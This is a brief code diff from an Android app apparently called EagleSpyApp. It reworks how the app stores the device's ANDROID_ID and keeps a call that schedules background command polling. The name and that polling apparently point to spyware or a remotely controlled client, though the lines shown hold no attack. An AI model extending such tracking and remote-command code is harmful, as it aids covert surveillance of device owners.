@@ -33,10 +33,10 @@ class EagleSpyApp : Application() {
         }
 
         // Generate unique device ID
-        deviceId = android.provider.Settings.Secure.getString(
+        EagleSpyApp.deviceId = android.provider.Settings.Secure.getString(
             contentResolver,
             android.provider.Settings.Secure.ANDROID_ID
-        )
+        ).orEmpty()
 
         // Schedule background command polling
         scheduleCommandWorker()
